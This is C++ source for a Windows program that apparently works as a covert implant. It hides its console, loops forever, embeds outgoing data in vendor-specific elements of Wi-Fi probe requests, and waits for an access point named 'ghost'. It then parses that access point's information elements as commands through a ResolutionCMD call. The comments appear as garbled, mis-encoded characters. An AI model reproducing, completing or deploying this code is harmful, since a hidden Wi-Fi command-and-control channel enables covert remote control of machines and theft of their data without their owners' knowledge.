#ifndef UNICODE
#define UNICODE
#endif
#include "stdafx.h"
#include <windows.h>
#include <wlanapi.h>
#include <objbase.h>
#include <wtypes.h>
#include "1.h"
#include <stdio.h>
#include <stdlib.h>
#include "Action_Abs.h"
#include "Action_1.h"
// Need to link with Wlanapi.lib and Ole32.lib
#pragma comment(lib, "wlanapi.lib")	//��ʾ����wlanapi.lib�����
#pragma comment(lib, "ole32.lib")

//��װpayload

PWLAN_RAW_DATA get_payload(char *buf){

	//�ṹ���ʼ���ڴ�
	HLOG("[INFO]Send Context is :%s\n", buf);
	int len = strlen(buf) + 1;	//lenΪ���ݳ��ȣ�+1��������
	int response_len = sizeof(DWORD)  + sizeof(struct ie_data)-1  + len;//!!4+2+8  14,��Ϊÿ���ṹ�嶼������һ����������ݣ�ռ1�ֽ�
	char *response = (char *)malloc(response_len);//���ٴ洢�ռ�
	memset(response, '\0', response_len);//ȫ�����Ϊ'\0'
	//��������ָ��
	PWLAN_RAW_DATA pwlan_data = (PWLAN_RAW_DATA)response;
	struct ie_data *piedata = (struct ie_data *)&pwlan_data->DataBlob[0];
	//д���ݰ�
	pwlan_data->dwDataSize = sizeof(struct ie_data) - 1 + len;
	piedata->id = (char)221;
	piedata->len = len;
	memcpy(&piedata->val[0], buf, len);
	return pwlan_data;
}

//��ȡ���
DWORD get_Handle(HANDLE *hClient, DWORD dwMaxClient,DWORD dwCurVersion){
	//dwMaxClient Ϊ�ͻ���֧�ֵ�WLANAPI����߰汾��dwCurVersion Ϊ��λỰ�н���ʹ�õİ汾

	DWORD dwResult = WlanOpenHandle(dwMaxClient, NULL, &dwCurVersion, hClient);//��һ��������������ӣ���wlan�����
	//HLOG("WlanOpenHandle failed with error: %u\n", dwResult);
	if (dwResult != ERROR_SUCCESS) {
		HLOG("��ERROR��WlanOpenHandle failed with error: %u\n", dwResult);
	}
	return dwResult;
}

//��ѯ�����б�
DWORD get_WlanList(HANDLE *hClient, PWLAN_INTERFACE_INFO_LIST *pIfList ) {
	if (*pIfList != NULL) {	//����б�
		WlanFreeMemory(*pIfList);
		*pIfList = NULL;
	}
	DWORD dwResult = WlanEnumInterfaces(*hClient, NULL, pIfList);//ö�������ڱ��ؼ�����ϵ�ǰ���õ�����LAN�ӿ�
	if (dwResult != ERROR_SUCCESS) {
		HLOG("��ERROR��WlanEnumInterfaces failed with error: %u\n", dwResult);
	}
	return dwResult;
}

//��ѯ����״̬
PWLAN_INTERFACE_INFO get_Wlan(PWLAN_INTERFACE_INFO_LIST *pIfList) {
	PWLAN_INTERFACE_INFO pIfInfo = NULL;
	WCHAR GuidString[40] = { 0 };
	HLOG("[INFO]Interface Information��\n");
	HLOG("  Numbers of Interface: %lu\n", (*pIfList)->dwNumberOfItems);//��ӡwlan��Ŀ��
	HLOG("  Current Index: %lu\n", (*pIfList)->dwIndex);//��ӡ��ǰ����
	for (int i = 0; i < (int)(*pIfList)->dwNumberOfItems; i++) {
		pIfInfo = (WLAN_INTERFACE_INFO *)&(*pIfList)->InterfaceInfo[i];
		HLOG("  Interface Index[%d]:\t %lu\n", i, i);
		int iRet = StringFromGUID2((pIfInfo)->InterfaceGuid, (LPOLESTR)&GuidString, 39);//��ӡGUID
		if (iRet == 0)
			HLOG("StringFromGUID2 failed\n");
		else {
			HLOG("  InterfaceGUID[%d]: %ws\n", i, GuidString);
		}
		HLOG("  Interface Description[%d]: %ws", i,
			(pIfInfo)->strInterfaceDescription);//��ӡ����
		HLOG("\n");
		HLOG("  Interface State[%d]:\t ", i);//��ӡ״̬
		switch ((pIfInfo)->isState) {
		case wlan_interface_state_not_ready:
			HLOG("Not ready\n");
			break;
		case wlan_interface_state_connected:
			HLOG("Connected\n");
			break;
		case wlan_interface_state_ad_hoc_network_formed:
			HLOG("First node in a ad hoc network\n");
			break;
		case wlan_interface_state_disconnecting:
			HLOG("Disconnecting\n");
			break;
		case wlan_interface_state_disconnected:
			HLOG("Not connected\n");
			break;
		case wlan_interface_state_associating:
			HLOG("Attempting to associate with a network\n");
			break;
		case wlan_interface_state_discovering:
			HLOG("Auto configuration is discovering settings for the network\n");
			break;
		case wlan_interface_state_authenticating:
			HLOG("In process of authenticating\n");
			break;
		default:
			HLOG("Unknown state %ld\n", (pIfInfo)->isState);
			break;
		}
	}
	return pIfInfo;//Ĭ�ϲ��÷������һ��������Ϣ
}

//����̽��
DWORD sendRequest(HANDLE *hClient, PWLAN_INTERFACE_INFO *pIfInfo, char *ssid, PWLAN_RAW_DATA pwlan_data){
	//ssid Ϊ��Ҫ������SSID���ƣ�pwlan_data Ϊ��װ��payload

	//PDOT11_SSID pdo = new DOT11_SSID;  //�洢ssid�Ľṹ��
	//pdo->uSSIDLength = strlen(ssid); //��ȡssid�ĳ��ȣ�����ṹ����.. ULONG����
	//UCHAR *ucp = (UCHAR *)malloc(pdo->uSSIDLength + 1);	//����һ���ռ䣬����λSSID�ĳ���
	//memset(ucp, '\0', pdo->uSSIDLength + 1);	//ucp�����uSSIDLength���ȵĿռ���'\0'���
	//strcpy((char*)ucp, ssid);//��ssid��ֵ��������

	DWORD dwResult = WlanScan(*hClient, &(*pIfInfo)->InterfaceGuid, NULL, pwlan_data, NULL);//ָ���ӿ��Ͻ�������ɨ��
	if (dwResult != ERROR_SUCCESS) {
		HLOG("��ERROR��Sending probe Request with error: %u\n", dwResult);
	}
	else {
		HLOG("[INFO]Sending probe Request...\n");
	}
	//free(pdo);  //�ͷſռ�
	return dwResult;
}

//��ȡ�ظ���Ϣ
boolean getInfomation(HANDLE *hClient, PWLAN_INTERFACE_INFO *pIfInfo, WLAN_AVAILABLE_NETWORK *pBssEntry,Action_Abs *action) {
	PWLAN_BSS_LIST ppWlanBssList;	
	DWORD dwResult2 = WlanGetNetworkBssList(*hClient, &(*pIfInfo)->InterfaceGuid,//����һ������������LAN�ӿ��ϵ��������������Ļ������񼯣�BSS������Ŀ���б�
		&pBssEntry->dot11Ssid,
		pBssEntry->dot11BssType,
		pBssEntry->bSecurityEnabled,
		NULL,
		&ppWlanBssList);
	boolean GetInfoOK_STATUS = false;
	HLOG("%d", ppWlanBssList->dwNumberOfItems);
	for (int z = 0; z < ppWlanBssList->dwNumberOfItems; z++)
	{
		WLAN_BSS_ENTRY *bss_entry = &ppWlanBssList->wlanBssEntries[z];

		HLOG("========\nUSSID�� %s\n", bss_entry->dot11Ssid.ucSSID);
		//HLOG("�ź�ǿ�ȣ�%d\n", bss_entry->lRssi);

		char *pp = (char *)((unsigned long)bss_entry + bss_entry->ulIeOffset);//��ϢԪ�ص�λ��
		int total_size = bss_entry->ulIeSize;
		//HLOG("���ȣ�%d",total_size);
		GetInfoOK_STATUS = action->ResolutionCMD(pp, total_size);
	}//for
	return GetInfoOK_STATUS;	//������ڶ��BSS������������bug!!!!
}

//��ȡ����AP,Ѱ�������AP
boolean getssid(HANDLE *hClient, PWLAN_INTERFACE_INFO *pIfInfo, char *ssid, Action_Abs *action) {
	PWLAN_AVAILABLE_NETWORK_LIST pBssList = NULL; //����������Ϣ�б�

	DWORD dwResult = WlanGetAvailableNetworkList(*hClient, &(*pIfInfo)->InterfaceGuid, 0, NULL, &pBssList);//��ȡ����LAN�ӿ��ϵĿ��������б�
	WLAN_AVAILABLE_NETWORK* pBssEntry = NULL;
	boolean ExcuteCmdOK = FALSE;
	bool findAP = false;
	if (dwResult != ERROR_SUCCESS) {
		HLOG("��ERROR��WlanGetAvailableNetworkList failed with error: %u\n", dwResult);
	}
	else {
		HLOG("[INFO]Numbers of AP: %lu\n", (pBssList)->dwNumberOfItems);//��ӡAP�ĸ���
		for (int j = 0; j < (pBssList)->dwNumberOfItems; j++) {	//����ÿ��AP�����ƣ������бȽ�
			pBssEntry = (WLAN_AVAILABLE_NETWORK *)& (pBssList)->Network[j];
			HLOG("(%d):%s   ", j, (char *)pBssEntry->dot11Ssid.ucSSID);
			if (_stricmp((char *)pBssEntry->dot11Ssid.ucSSID, ssid) == 0) {
				findAP = TRUE;
				break;
			}
		}
	}
	
	if(findAP){
		HLOG("\n[INFO]Find Server!\n");
		ExcuteCmdOK = getInfomation(hClient, pIfInfo, pBssEntry, action);
	}
	else {
		HLOG("\n[INFO]Searching Server...\n");
	}

	if (pBssList != NULL) {
		WlanFreeMemory(pBssList);
		pBssList = NULL;
	}
	return ExcuteCmdOK;
}

int main()
{
#ifndef __DEBUG__
	ShowWindow(GetConsoleWindow(), SW_HIDE);
#endif

	HANDLE hClient = NULL;//ָ��wlan�ͻ����ڻỰ��ʹ�õľ������������ᴩ�����Ự����������ʹ��
	PWLAN_INTERFACE_INFO_LIST pIfList = NULL; //ָ��洢 ���ؼ�������õ�����LAN�ӿ� ��ָ��
	PWLAN_INTERFACE_INFO pIfInfo = NULL;//������Ϣ

	struct STATUS_WLAN status_wlan = {-1,-1,-1};//����״̬������Ŀ�����ڱ�������¿����ظ�ִ��֮ǰ�����Ŀǰû��ʹ��~

	Action_Abs *action =new Action_1();

	char *ssid = "ghost";
	
	if (status_wlan.STATUS_handle != 0) {
		status_wlan.STATUS_handle = get_Handle(&hClient, 2, 0);
	}
	if (status_wlan.STATUS_wlanList != 0) {
		status_wlan.STATUS_wlanList = get_WlanList(&hClient, &pIfList);
		pIfInfo = get_Wlan(&pIfList);
	}

	while (true) {
		HLOG("----NEW-----\n");
		status_wlan.STATUS_sendRequest = sendRequest(&hClient, &pIfInfo, NULL, get_payload(action->get_sendInfo()));
		getssid(&hClient, &pIfInfo, ssid, action);
		HLOG("----OVER----\n\n\n");
		Sleep(1000);
	}
	return 0;
}
